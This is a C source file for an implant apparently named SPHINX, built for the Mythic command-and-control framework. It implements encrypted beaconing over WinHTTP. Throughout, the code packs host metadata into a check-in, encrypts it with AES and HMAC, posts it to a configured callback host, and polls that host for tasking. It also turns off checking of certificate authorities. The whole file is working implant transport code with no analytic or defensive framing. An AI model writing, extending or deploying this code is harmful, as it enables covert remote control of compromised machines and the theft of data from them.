/*
 * comms.c — HTTP transport to the C2 (WinHTTP)
 *
 * Message framing (mythic_encrypts = True):
 *   Send:    body = base64( uuid(36) || IV(16) || AES256CBC(PKCS7(tlv)) || HMAC-SHA256 )
 *   Receive: base64( uuid(36) || IV(16) || AES256CBC(PKCS7(tlv)) || HMAC-SHA256 )
 *
 * The uuid is the callback UUID (or PAYLOAD_UUID on the first check-in).
 * Encryption/decryption lives in crypto.c; this file handles framing and transport only.
 */

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <winhttp.h>
#include <ntsecapi.h>
#include <string.h>
#include <stdlib.h>
#include "../Include/config.h"
#include "../Include/crypto.h"
#include "../Include/packer.h"
#include "../Include/parser.h"
#include "../Include/utils.h"
#include "../Include/comms.h"

static uint8_t enc_key[32] = ENC_KEY;

/* Read the complete HTTP response body from hRequest (raw bytes, NOT base64-decoded).
   Accumulates chunks via WinHttpQueryDataAvailable + WinHttpReadData. */
static int read_all_response(HINTERNET hRequest, uint8_t* out, size_t max_len, size_t* out_len) {
    DWORD total = 0;

    for (;;) {
        DWORD available = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &available)) return -1;
        if (available == 0) break;
        if (total + available > max_len) return -1;

        DWORD read = 0;
        if (!WinHttpReadData(hRequest, out + total, available, &read)) return -1;
        if (read == 0) break;
        total += read;
    }

    *out_len = total;
    return 0;
}

/* Decrypt a server response: base64-decode → strip uuid(36) → crypto_decrypt → recv_buf.
   raw/raw_len is the HTTP body (ASCII base64). Returns 0 on success, -1 on error. */
static int parse_server_response(const uint8_t* raw, size_t raw_len,
                                 uint8_t* recv_buf, size_t max_len, size_t* recv_len) {
    uint8_t* decoded = (uint8_t*)malloc(BASE64_DECODE_LEN(raw_len));
    if (!decoded) return -1;
    size_t decoded_len = base64_decode((const char*)raw, raw_len, decoded);

    if (decoded_len < 36 + 16 + 16 + 32) {   /* uuid + IV + 1 block + HMAC minimum */
        free(decoded);
        return -1;
    }

    int plain_len = crypto_decrypt(enc_key, decoded + 36, decoded_len - 36);
    if (plain_len < 0 || (size_t)plain_len > max_len) {
        free(decoded);
        return -1;
    }

    memcpy(recv_buf, decoded + 36, (size_t)plain_len);
    *recv_len = (size_t)plain_len;
    free(decoded);
    return 0;
}

int http_get(_In_ const wchar_t* host, _In_ uint16_t port, _In_ const wchar_t* path,
             _In_ const char* uuid,
             _Out_ uint8_t* recv_buf, _In_ size_t max_len, _Out_ size_t* recv_len) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    uint8_t* enc = NULL;
    uint8_t* combo = NULL;
    char* b64 = NULL;
    int result = -1;

    /* 1. Build GET body: empty get_tasking TLV ([0xA2][tasking_size=1]) encrypted
          like any other message (Mythic expects a full encrypted blob, not just the UUID) */
    uint8_t tlv[5];
    size_t tlv_off = 0;
    pack_byte(tlv, &tlv_off, MSG_GET_TASKING);
    pack_post_response_start(tlv, &tlv_off, 1);

    enc = (uint8_t*)malloc(5 + 64);
    if (!enc) goto cleanup;
    size_t enc_len = crypto_encrypt(enc_key, tlv, 5, enc);
    if (enc_len == 0) goto cleanup;

    combo = (uint8_t*)malloc(36 + enc_len);
    if (!combo) goto cleanup;
    memcpy(combo, uuid, 36);
    memcpy(combo + 36, enc, enc_len);
    free(enc); enc = NULL;

    b64 = (char*)malloc(BASE64_ENCODE_LEN(36 + enc_len) + 1);
    if (!b64) goto cleanup;
    base64_encode(combo, 36 + enc_len, b64);
    free(combo); combo = NULL;
    size_t b64_len = strlen(b64);

    /* 2. WinHTTP */
    hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto cleanup;

    WinHttpSetTimeouts(hSession, 5000, 5000, 10000, 10000);

    hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) goto cleanup;

    DWORD req_flags = 0;
#if USE_TLS
    req_flags = WINHTTP_FLAG_SECURE;
#endif

    hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL,
                                  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  req_flags);
    if (!hRequest) goto cleanup;

#if USE_TLS
    DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
#endif

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            (LPVOID)b64, (DWORD)b64_len, (DWORD)b64_len, 0)) goto cleanup;
    if (!WinHttpReceiveResponse(hRequest, NULL)) goto cleanup;

    DWORD status = 0, status_size = sizeof(status);
    WinHttpQueryHeaders(hRequest,
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
                        WINHTTP_NO_HEADER_INDEX);
    if (status != 200) goto cleanup;

    /* 3. Read response body and decrypt */
    uint8_t* raw = (uint8_t*)malloc(max_len * 2);
    if (!raw) goto cleanup;
    size_t raw_len = 0;
    if (read_all_response(hRequest, raw, max_len * 2, &raw_len) != 0) {
        free(raw);
        goto cleanup;
    }
    if (parse_server_response(raw, raw_len, recv_buf, max_len, recv_len) != 0) {
        free(raw);
        goto cleanup;
    }
    free(raw);

    result = 0;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    if (enc) free(enc);
    if (combo) free(combo);
    if (b64) free(b64);
    return result;
}

int http_post(_In_ const wchar_t* host, _In_ uint16_t port, _In_ const wchar_t* path,
              _In_ const char* uuid,
              _In_ const uint8_t* send_buf, _In_ size_t send_len,
              _Out_ uint8_t* recv_buf, _In_ size_t max_len, _Out_ size_t* recv_len) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    uint8_t* enc = NULL;
    uint8_t* combo = NULL;
    char* b64 = NULL;
    int result = -1;

    /* 1. Encrypt the TLV payload (Mythic wire format) */
    enc = (uint8_t*)malloc(send_len + 64);
    if (!enc) goto cleanup;
    size_t enc_len = crypto_encrypt(enc_key, send_buf, send_len, enc);
    if (enc_len == 0) goto cleanup;

    /* 2. Prepend uuid to encrypted blob */
    combo = (uint8_t*)malloc(36 + enc_len);
    if (!combo) goto cleanup;
    memcpy(combo, uuid, 36);
    memcpy(combo + 36, enc, enc_len);
    free(enc); enc = NULL;

    /* 3. Base64-encode for HTTP transport */
    b64 = (char*)malloc(BASE64_ENCODE_LEN(36 + enc_len) + 1);
    if (!b64) goto cleanup;
    base64_encode(combo, 36 + enc_len, b64);
    free(combo); combo = NULL;

    /* 4. WinHTTP POST */
    hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) goto cleanup;

    WinHttpSetTimeouts(hSession, 5000, 5000, 10000, 10000);

    hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) goto cleanup;

    DWORD req_flags = 0;
#if USE_TLS
    req_flags = WINHTTP_FLAG_SECURE;
#endif

    hRequest = WinHttpOpenRequest(hConnect, L"POST", path, NULL,
                                  WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                  req_flags);
    if (!hRequest) goto cleanup;

#if USE_TLS
    DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
#endif

    WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/octet-stream\r\n",
                             (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    size_t b64_len = strlen(b64);
    fprintf(stderr, "[SPHINX] http_post %ls:%u%ls body=%d bytes\n", host, port, path, (int)b64_len);
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            (LPVOID)b64, (DWORD)b64_len, (DWORD)b64_len, 0)) {
        fprintf(stderr, "[SPHINX] http_post send FAIL err=%lu\n", GetLastError());
        goto cleanup;
    }
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        fprintf(stderr, "[SPHINX] http_post recv FAIL err=%lu\n", GetLastError());
        goto cleanup;
    }

    DWORD status = 0, status_size = sizeof(status);
    WinHttpQueryHeaders(hRequest,
                        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size,
                        WINHTTP_NO_HEADER_INDEX);
    fprintf(stderr, "[SPHINX] http_post status=%lu\n", status);
    if (status != 200) goto cleanup;

    /* 5. Read response body and decrypt */
    uint8_t* raw = (uint8_t*)malloc(max_len * 2);
    if (!raw) goto cleanup;
    size_t raw_len = 0;
    if (read_all_response(hRequest, raw, max_len * 2, &raw_len) != 0) {
        free(raw);
        goto cleanup;
    }
    if (parse_server_response(raw, raw_len, recv_buf, max_len, recv_len) != 0) {
        free(raw);
        goto cleanup;
    }
    free(raw);

    result = 0;

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    if (enc) free(enc);
    if (combo) free(combo);
    if (b64) free(b64);
    return result;
}

int do_checkin(_Out_ char* uuid_out) {
    uint8_t send_buf[16384];
    size_t offset = 0;

    /* MSG_CHECKIN: check-in type byte followed by host metadata TLV */
    pack_byte(send_buf, &offset, MSG_CHECKIN);
    pack_checkin(send_buf, &offset, PAYLOAD_UUID);
    fprintf(stderr, "[SPHINX] pack_checkin ok, offset=%d\n", (int)offset);

    uint8_t recv_buf[4096];
    size_t recv_len = 0;

    if (http_post(CALLBACK_HOST, CALLBACK_PORT, POST_PATH, PAYLOAD_UUID,
                  send_buf, offset, recv_buf, sizeof(recv_buf), &recv_len) != 0) {
        fprintf(stderr, "[SPHINX] http_post FAIL\n");
        return -1;
    }
    fprintf(stderr, "[SPHINX] http_post ok, resp=%d bytes\n", (int)recv_len);

    return parse_checkin_response(recv_buf, recv_len, uuid_out);
}
